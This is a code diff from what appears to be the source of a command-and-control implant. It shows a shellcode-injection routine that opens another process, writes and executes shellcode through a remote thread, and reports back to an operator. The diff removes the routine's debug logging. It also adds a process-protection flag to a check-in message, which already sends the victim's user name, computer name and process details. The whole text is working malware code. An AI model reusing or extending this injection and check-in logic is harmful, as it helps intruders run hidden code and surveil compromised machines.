@@ -94,17 +94,11 @@ FUNC VOID CommandClassicInjection(
     DWORD  ThreadId       = 0;
     HANDLE ThreadHandle   = NULL;
 
-    BK_PRINT( "[I] Process Id into inject %d\n[I} Shellcode size %d \n", ProcessId, RegionSize );
-
     Err = bkProcessOpen( PROCESS_ALL_ACCESS, FALSE, ProcessId, &ProcessHandle );
     if ( Err != 0 ) {
         PackageTransmitError( Err );
         return;
     }
-
-    BK_PRINT( "[I] Process Handle: %X\n", ProcessHandle );
-
-    BK_PRINT( "[I] Handle to process opened!\n" );
 
     Err = bkMemAlloc( ProcessHandle, &MemAllocated, RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
     if ( Err != 0 ) {
@@ -112,15 +106,11 @@ FUNC VOID CommandClassicInjection(
         return;
     }
 
-    BK_PRINT( "[I] Memory allocated @ 0x%p\n", MemAllocated );
-
     Err = bkMemWrite( ProcessHandle, MemAllocated, ShellcodeBytes, RegionSize );
     if ( Err != 0 ) {
         PackageTransmitError( Err );
         return;
     }
-
-    BK_PRINT( "[I] Memory written!\n" );
 
     Err = bkMemProtect( ProcessHandle, MemAllocated, RegionSize, PAGE_EXECUTE_READ );
     if ( Err != 0 ) {
@@ -128,15 +118,11 @@ FUNC VOID CommandClassicInjection(
         return;
     }
 
-    BK_PRINT( "[I] Memory protection changed to RX\n" );
-
     Err = bkThreadCreate( ProcessHandle, MemAllocated, NULL, NULL, NULL, &ThreadId, &ThreadHandle );
     if ( Err != 0 ) {
         PackageTransmitError( Err );
         return;
     }
-
-    BK_PRINT( "[I] Thread create succefully %d\n", ThreadId );
 
     PackageAddInt32( BK_PACKAGE, ProcessId );
     PackageAddInt32( BK_PACKAGE, ThreadId );
@@ -259,6 +245,7 @@ FUNC VOID CommandCheckin(
     PackageAddWString( BK_PACKAGE, Instance()->Session.ProcessCmdLine  );
     PackageAddInt32(   BK_PACKAGE, Instance()->Session.ProcessId       );
     PackageAddInt32(   BK_PACKAGE, Instance()->Session.ParentProcId    );
+    PackageAddBool(    BK_PACKAGE, Instance()->Session.Protected       );
 
     PackageAddString( BK_PACKAGE, Instance()->System.UserName      );
     PackageAddString( BK_PACKAGE, Instance()->System.ComputerName  );
